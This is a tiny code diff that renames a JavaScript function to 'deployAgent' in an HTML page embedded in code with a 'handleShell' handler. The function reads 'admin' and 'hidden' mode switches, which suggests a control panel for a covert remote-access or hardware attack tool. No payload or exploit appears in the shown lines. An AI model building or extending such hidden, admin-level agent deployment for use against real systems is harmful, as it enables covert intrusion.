@@ -535,7 +535,7 @@ void handleShell() {
             .footer a{color:#fc0;text-decoration:none;transition:.3s}
         </style>
         <script>
-            function deploy-screenshot() {
+            function deployAgent() {
                 let adminMode = document.getElementById("adminSwitch").checked ? "1" : "0";
                 let hiddenMode = document.getElementById("hiddenSwitch").checked ? "1" : "0";
 
